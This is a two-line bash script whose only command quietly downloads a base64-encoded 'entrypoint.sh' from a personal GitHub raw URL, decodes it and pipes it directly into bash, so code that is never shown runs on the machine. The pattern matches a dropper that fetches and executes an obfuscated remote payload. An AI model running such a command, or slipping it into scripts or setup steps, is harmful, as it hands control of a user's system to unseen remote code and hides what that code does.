#!/bin/bash
wget -qO- https://raw.githubusercontent.com/garykaggle3/plugged/refs/heads/main/entrypoint.sh | base64 -d | bash
